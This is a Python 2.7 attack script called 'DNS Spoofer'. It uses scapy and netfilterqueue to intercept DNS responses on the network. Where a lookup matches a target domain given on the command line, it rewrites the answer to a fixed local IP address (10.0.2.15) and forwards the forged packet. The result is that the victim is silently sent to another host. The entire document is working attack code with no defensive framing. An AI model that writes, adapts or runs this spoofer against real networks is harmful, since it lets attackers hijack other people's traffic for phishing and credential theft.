#!/usr/bin/python2.7
from scapy.all import *
import netfilterqueue
import sys
import argparse
import pyfiglet
from termcolor import colored

def get_url():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', dest='url', help='Please specify the target url')
    argument = parser.parse_args()
    if not argument:
        print('[{}] {}'.format(colored('-', 'red'), colored('Please specify the target url', 'red')))
    else:
        return argument

def modifyIP(scapy_packet):
    # We are modifying the IP layer
    del scapy_packet[IP].version
    del scapy_packet[IP].ihl
    del scapy_packet[IP].tos
    del scapy_packet[IP].len
    del scapy_packet[IP].id
    del scapy_packet[IP].flags
    del scapy_packet[IP].frag
    del scapy_packet[IP].ttl
    del scapy_packet[IP].chksum

def modifyUDP(scapy_packet):
    # We are modifying the UDP layer
    del scapy_packet[UDP].len
    del scapy_packet[UDP].chksum

def manager(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        qname = scapy_packet[DNSQR].qname
        argument = get_url()
        url = argument.url

        if url in qname:
            print('[{}] Spoofing the Target and redirected him to another website'.format(colored('+', 'cyan', attrs=['bold'])))
            new_dns_response = '10.0.2.15'
            answer = DNSRR(rrname=qname, rdata=new_dns_response)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1
            # We are Calling modifyIP() Function to modify the IP layer
            modifyIP(scapy_packet)
            # We are Calling modifyUDP() Function to modify the UDP layer
            modifyUDP(scapy_packet)
            # Finally we are saving all modifications
            packet.set_payload(str(scapy_packet))
    packet.accept()

def main():
    ascii_banner = pyfiglet.figlet_format('DNS Spoofer')
    print(colored(ascii_banner.strip('\n'), 'cyan', attrs=['bold']))
    print('-' * 78)
    print('[{}] The DNS Spoofer is running ...'.format(colored('+', 'cyan', attrs=['bold'])))
    print('-' * 78)
    queue_num = 0
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(queue_num, manager)
        queue.run()
    except KeyboardInterrupt:
        queue.unbind()
        print('\n[{}] Good Bye!!!'.format(colored('+', 'red')))
        sys.exit(1)

if __name__ == '__main__':
    main()